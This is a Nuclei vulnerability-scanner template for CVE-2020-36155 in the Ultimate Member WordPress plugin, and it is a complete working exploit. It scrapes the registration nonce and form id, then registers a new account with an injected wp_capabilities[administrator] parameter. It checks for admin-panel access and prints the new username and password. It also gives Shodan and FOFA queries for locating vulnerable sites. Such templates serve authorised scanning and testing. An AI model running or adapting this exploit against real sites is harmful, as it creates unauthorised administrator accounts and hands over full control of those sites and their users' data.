flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body
    regex:
    - name="_wpnonce" value="(.*?)"
    type: regex
  - group: 1
    internal: true
    name: id
    part: body
    regex:
    - class="um um-register um-(.*?)"
    type: regex
  raw:
  - 'GET /register/ HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(header, 'wordpress_logged_in')
    - len(body) == 1
    internal: true
    type: dsl
  raw:
  - 'POST /register HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    user_login-{{id}}={{name}}&first_name-{{id}}={{firstname}}&last_name-{{id}}={{lastname}}&user_email-{{id}}={{email}}&user_password-{{id}}={{password}}&confirm_user_password-{{id}}={{password}}&wp_capabilities%5Badministrator%5D=&form_id={{id}}&timestamp={{unix_time()}}&um_request=&_wpnonce={{nonce}}&_wp_http_referer=register

    '
- extractors:
  - dsl:
    - '"USER: "+ name'
    - '"PASS: "+ password'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_all(body,'Edit Profile','All Posts')
    type: dsl
  raw:
  - 'GET /wp-admin/users.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2020-36155
info:
  author: riteshs4hu
  classification:
    cpe: cpe:2.3:a:ultimatemember:ultimate_member:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2020-36155
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-269
    epss-percentile: 0.98235
    epss-score: 0.61437
  description: 'An issue was discovered in the Ultimate Member plugin before 2.1.12
    for WordPress, aka Unauthenticated Privilege Escalation via User Meta. An attacker
    could supply an array parameter for sensitive metadata, such as the wp_capabilities
    user meta that defines a user''s role. During the registration process, submitted
    registration details were passed to the update_profile function, and any metadata
    was accepted, e.g., wp_capabilities[administrator] for Administrator access.

    '
  impact: 'Unauthenticated attackers can escalate privileges to administrator during
    registration, gaining complete control over the WordPress site and all user data.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/ultimate-member"
    framework: wordpress
    max-request: 3
    product: ultimate_member
    publicwww-query: /wp-content/plugins/ultimate-member
    shodan-query: http.html:/wp-content/plugins/ultimate-member/
    vendor: ultimatemember
    verified: true
  name: Ultimate Member < 2.1.12 - Unauthenticated Privilege Escalation via User Meta
  reference:
  - https://wpscan.com/vulnerability/cf13b0f8-5815-4d27-a276-5eff8985fc0b/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-36155
  - https://wordpress.org/plugins/ultimate-member/#developers
  remediation: Fixed in 2.1.12
  severity: critical
  tags: cve,cve2020,wordpress,wp-plugin,wp,wpscan,ultimate-member,intrusive,privesc,vkev,vuln
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  firstname: '{{rand_base(5)}}'
  lastname: '{{rand_base(5)}}'
  name: '{{to_lower(rand_text_alpha(5))}}'
  password: '{{rand_base(8)}}'
